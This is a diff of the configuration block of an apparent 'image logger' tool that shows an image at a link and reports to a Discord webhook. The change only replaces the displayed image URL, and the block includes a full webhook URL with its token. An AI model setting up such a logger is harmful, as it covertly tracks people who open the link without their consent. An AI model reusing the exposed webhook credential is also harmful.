@@ -13,7 +13,7 @@ __author__ = "C00lB0i"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1511498948660035656/e5-aiRIQcjPkB3FG3BqH0TP2fYTE4fHt31zYTAc_HvMgKmZw5CwNDL7lZCiutUqdxQeT",
-    "image": "https://cdn.culturagenial.com/es/imagenes/acercamiento-de-el-angel-caido-de-cabanel.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://upload.wikimedia.org/wikipedia/commons/c/c8/Fire_Salamander.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
